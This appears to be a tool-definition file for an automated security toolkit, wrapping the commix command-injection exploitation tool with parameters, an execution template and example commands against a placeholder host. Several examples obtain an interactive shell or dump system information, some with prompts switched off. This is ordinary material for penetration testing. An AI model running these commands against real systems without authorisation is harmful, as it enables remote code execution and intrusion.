---
id: security-web-commix
namespace: security:web:commix
name: commix
description: Automated command injection exploitation tool for testing and exploiting OS command injection vulnerabilities.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - web.injection.command
  - web.exploitation.rce
  - security.exploit.command
  - web.discovery.injection
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - sqlmap
  - shellshocker
artifacts:
  - type: web.exploit.command.shell
    description: Shell session artifacts
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - execution-results
    - os-shell
  consumes:
    - target-url
contract:
  inputs:
    - type: web.target.url
      description: Target URL with injectable parameter
  outputs:
    - type: web.injection.command.results
      description: Command injection test results
      mime: text/plain
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: medium
    memory_mb: 128
    network: medium
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 128
  network: medium
  disk_io: low
allowed-tools:
  - commix
  - Bash
  - execFile
parameters:
  - name: url
    type: string
    required: true
    description: "Target URL (-u)"
    aliases:
      - -u
  - name: data
    type: string
    required: false
    description: "POST data string (--data)"
    aliases:
      - --data
  - name: headers
    type: string
    required: false
    description: "Custom HTTP headers (-H)"
    aliases:
      - -H
  - name: cookie
    type: string
    required: false
    description: "HTTP Cookie header (--cookie)"
    aliases:
      - --cookie
  - name: user-agent
    type: string
    required: false
    description: "Custom User-Agent (--user-agent)"
    aliases:
      - --user-agent
  - name: referer
    type: string
    required: false
    description: "HTTP Referer header (--referer)"
    aliases:
      - --referer
  - name: os
    type: string
    required: false
    description: "Target OS (--os)"
    aliases:
      - --os
  - name: method
    type: string
    required: false
    description: "HTTP method to use (--method)"
    default_value: "GET"
    aliases:
      - --method
  - name: payload
    type: string
    required: false
    description: "Custom injection payload (--payload)"
    aliases:
      - --payload
  - name: technique
    type: string
    required: false
    description: "Injection technique to use (--technique)"
    aliases:
      - --technique
  - name: level
    type: integer
    required: false
    description: "Level of tests 1-3 (--level)"
    default_value: "1"
    aliases:
      - --level
  - name: batch
    type: boolean
    required: false
    description: "Never ask for user input (--batch)"
    aliases:
      - --batch
  - name: shell
    type: boolean
    required: false
    description: "Obtain an interactive shell (--shell)"
    aliases:
      - --shell
  - name: delay
    type: integer
    required: false
    description: "Delay between requests (--delay)"
    default_value: "0"
    aliases:
      - --delay
  - name: proxy
    type: string
    required: false
    description: "Proxy URL (--proxy)"
    aliases:
      - --proxy
execution:
  template: "commix -u {target} --batch"
  sandbox: execFile
  timeout_seconds: 600
  shell: false
global_vars:
  target: url
examples:
  - description: "Basic command injection test"
    command: commix -u "http://target.com/page.php?cmd=ls" --batch
  - description: "Test with POST data"
    command: commix -u "http://target.com/search" --data "q=test" --batch
  - description: "Get interactive shell"
    command: commix -u "http://target.com/page.php?cmd=ls" --shell
  - description: "With custom headers and cookie"
    command: 'commix -u "http://target.com/page.php?cmd=ls" -H "X-Custom: value" --cookie "PHPSESSID=abc123" --batch'
  - description: "Use proxy"
    command: commix -u "http://target.com/page.php?cmd=ls" --proxy "http://127.0.0.1:8080" --batch
references:
  - label: "Commix GitHub"
    url: "https://github.com/commixproject/commix"
  - label: "Commix documentation"
    url: "https://github.com/commixproject/commix/wiki"
phase: exploitation
techniques:
  - execution
items:
  - NoCreds
services: []
attack_types:
  - Exploitation
---

# Commix — Automated Command Injection

Commix (Command Injection Exploiter) is an automated tool for detecting and exploiting command injection vulnerabilities in web applications.

## Basic Usage

```bash
# Simple GET parameter test
commix -u "http://target.com/page.php?cmd=ls" --batch

# POST data test
commix -u "http://target.com/search" --data "q=test" --batch
```

## Exploitation

```bash
# Get interactive shell
commix -u "http://target.com/page.php?cmd=ls" --shell

# Dump all available info
commix -u "http://target.com/page.php?cmd=ls" --all --batch
```

## Techniques

| Technique | Description |
|-----------|-------------|
| `--technique=classic` | Classic command injection |
| `--technique=eval` | Code evaluation injection |
| `--technique=file-based` | File-based injection |
| `--technique=all` | All techniques |
